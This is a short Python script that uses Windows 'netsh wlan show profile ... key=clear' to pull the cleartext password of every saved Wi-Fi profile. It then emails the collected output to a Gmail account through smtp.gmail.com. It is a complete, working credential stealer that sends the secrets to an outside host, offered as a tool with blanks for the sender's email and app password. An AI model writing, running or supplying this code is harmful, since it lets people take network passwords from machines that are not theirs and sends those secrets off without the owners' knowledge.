import subprocess
import smtplib
import re

profile_command = 'netsh wlan show profile '

# Enter your gmail and  application password of the corresponding gmail
email = ''
passwd = ''


def send_mail(email, passwd, content):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, passwd)
    server.sendmail(email, email, content)
    server.quit()


def find_password(network_name):
    password_command = f'{profile_command}"{network_name}" key=clear'
    try:
        current_res = subprocess.check_output(password_command, shell=True)
        return current_res.decode(errors='ignore')
    except subprocess.CalledProcessError as e:
        print(f'Failed to retrieve password for {network_name}: {e}')
        return None


def capture_and_send():
    try:
        networks = subprocess.check_output(profile_command, shell=True)
        network_names_list = re.findall('(?:Profile\s*:\s)(.*)',
                                        networks.decode(errors='ignore'))
        result = ''
        for network_name in network_names_list:
            password = find_password(network_name.strip())
            if password:
                result += f'{password} \n'

        send_mail(email, passwd, result)
    except subprocess.CalledProcessError as e:
        print(f'Failed to retrieve network profiles: {e}')


if __name__ == '__main__':
    capture_and_send()
